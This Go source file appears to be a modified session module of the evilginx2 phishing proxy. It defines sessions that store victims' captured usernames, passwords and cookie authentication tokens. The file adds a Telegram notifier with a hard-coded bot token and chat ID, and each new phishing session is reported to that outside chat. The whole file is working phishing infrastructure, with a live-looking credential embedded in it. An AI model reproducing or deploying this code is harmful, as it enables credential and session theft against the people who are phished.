package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"

	"github.com/kgretzky/evilginx2/database"
)

const (
	telegramBotToken = "7980984608:AAGmHs4n5z_X5pAztAQepCRCx_j39Z9Esis" // Replace with your bot token
	telegramChatID = "-4784285491"   // Replace with your chat ID
)

func SendTelegramMessage(message string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramBotToken)
	payload := map[string]string{
		"chat_id": telegramChatID,
		"text":    message,
	}

	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("error marshalling payload: %w", err)
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(payloadBytes))
	if err != nil {
		return fmt.Errorf("error sending request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("unexpected status code: %d, response body: %s", resp.StatusCode, body)
	}

	return nil
}

// Session represents a user session.
type Session struct {
	Id             string
	Name           string
	Username       string
	Password       string
	Custom         map[string]string
	Params         map[string]string
	BodyTokens     map[string]string
	HttpTokens     map[string]string
	CookieTokens   map[string]map[string]*database.CookieToken
	RedirectURL    string
	IsDone         bool
	IsAuthUrl      bool
	IsForwarded    bool
	ProgressIndex  int
	RedirectCount  int
	PhishLure      *Lure
	RedirectorName string
	LureDirPath    string
	DoneSignal     chan struct{}
	RemoteAddr     string
	UserAgent      string
}

// NewSession creates a new session and sends a Telegram notification.
func NewSession(name string) (*Session, error) {
	s := &Session{
		Id:             GenRandomToken(),
		Name:           name,
		Username:       "",
		Password:       "",
		Custom:         make(map[string]string),
		Params:         make(map[string]string),
		BodyTokens:     make(map[string]string),
		HttpTokens:     make(map[string]string),
		RedirectURL:    "",
		IsDone:         false,
		IsAuthUrl:      false,
		IsForwarded:    false,
		ProgressIndex:  0,
		RedirectCount:  0,
		PhishLure:      nil,
		RedirectorName: "",
		LureDirPath:    "",
		DoneSignal:     make(chan struct{}),
		RemoteAddr:     "",
		UserAgent:      "",
	}
	s.CookieTokens = make(map[string]map[string]*database.CookieToken)

	// Send a notification to Telegram
	message := fmt.Sprintf("New session created:\nID: %s\nName: %s\n", s.Id, s.Name)
	if err := SendTelegramMessage(message); err != nil {
		return nil, fmt.Errorf("error sending telegram message: %w", err)
	}

	return s, nil
}

// SetUsername sets the username for the session.
func (s *Session) SetUsername(username string) {
	s.Username = username
}

// SetPassword sets the password for the session.
func (s *Session) SetPassword(password string) {
	s.Password = password
}

// SetCustom sets a custom value in the session.
func (s *Session) SetCustom(name string, value string) {
	s.Custom[name] = value
}

// AddCookieAuthToken adds a cookie authentication token to the session.
func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
	if _, ok := s.CookieTokens[domain]; !ok {
		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
	}

	if tk, ok := s.CookieTokens[domain][key]; ok {
		tk.Name = key
		tk.Value = value
		tk.Path = path
		tk.HttpOnly = http_only
	} else {
		s.CookieTokens[domain][key] = &database.CookieToken{
			Name:     key,
			Value:    value,
			HttpOnly: http_only,
		}
	}
}

// AllCookieAuthTokensCaptured checks if all cookie authentication tokens have been captured.
func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
	tcopy := make(map[string][]CookieAuthToken)
	for k, v := range authTokens {
		tcopy[k] = []CookieAuthToken{}
		for _, at := range v {
			if !at.optional {
				tcopy[k] = append(tcopy[k], *at)
			}
		}
	}

	for domain, tokens := range s.CookieTokens {
		for tk := range tokens {
			if al, ok := tcopy[domain]; ok {
				for an, at := range al {
					match := false
					if at.re != nil {
						match = at.re.MatchString(tk)
					} else if at.name == tk {
						match = true
					}
					if match {
						tcopy[domain] = append(tcopy[domain][:an], tcopy[domain][an+1:]...)
						if len(tcopy[domain]) == 0 {
							delete(tcopy, domain)
						}
						break
					}
				}
			}
		}
	}

	if len(tcopy) == 0 {
		return true
	}
	return false
}

// Finish marks the session as finished and signals the DoneSignal channel.
func (s *Session) Finish(is_auth_url bool) {
	if !s.IsDone {
		s.IsDone = true
		s.IsAuthUrl = is_auth_url
		if s.DoneSignal != nil {
			close(s.DoneSignal)
			s.DoneSignal = nil
		}
	}
}
